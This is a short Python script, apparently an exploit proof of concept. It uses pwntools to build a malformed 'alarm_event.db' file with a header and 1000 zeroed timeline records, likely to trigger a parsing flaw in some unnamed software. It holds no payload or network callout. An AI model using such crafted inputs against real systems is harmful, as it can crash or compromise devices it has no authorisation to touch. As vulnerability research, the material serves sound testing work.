import struct
import socket
from pwn import *
import time
from util import *
import re
import os

class EventDbHeader:
    def __init__(self, num):
        self.magic = 0x88
        self.num = num

    def to_bytes(self):
        return self.magic.to_bytes(4, byteorder='little') + self.num.to_bytes(4, byteorder='little')

class Timeline:
    def __init__(self, in_type, start_time, duration):
        self.type = in_type
        self.start_time = start_time
        self.duration = duration

    def to_bytes(self):
        return self.type.to_bytes(4, byteorder='little') + self.start_time.to_bytes(4, byteorder='little') + self.duration.to_bytes(4, byteorder='little')

class EventDbFile:
    def __init__(self):
        self.timelines = []
        self.count = 0

    def addTimeline(self, in_type, start_time, duration):
        self.timelines.append(Timeline(in_type, start_time, duration))
        self.count += 1

    def to_bytes(self):
        to_return = EventDbHeader(self.count).to_bytes()
        for timeline in self.timelines:
            to_return += timeline.to_bytes()
        return to_return

def event_db_poc():
    event_db_file = EventDbFile()

    for i in range(1000):
        event_db_file.addTimeline(0x0, 0x0, 0x0)

    with open('alarm_event.db', 'wb') as f:
        f.write(event_db_file.to_bytes())

    success("File saved")
